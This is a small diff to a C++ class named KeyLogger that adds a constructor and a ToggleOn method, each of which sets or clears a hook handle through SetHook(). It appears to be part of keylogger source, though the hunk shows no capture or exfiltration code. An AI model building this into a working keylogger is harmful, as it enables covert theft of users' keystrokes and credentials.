@@ -21,7 +21,24 @@ class KeyLogger
         }
     }
 
-    void ToggleOn();
+public:
+    KeyLogger(bool enable) {
+        if (!enable) {
+            HK = NULL;
+        }
+        else {
+            SetHook();
+        }
+    }
+
+    void ToggleOn() {
+        if (is_enabled) {
+            HK = NULL;
+        }
+        else {
+            SetHook();
+        }
+    }
 
 };
 
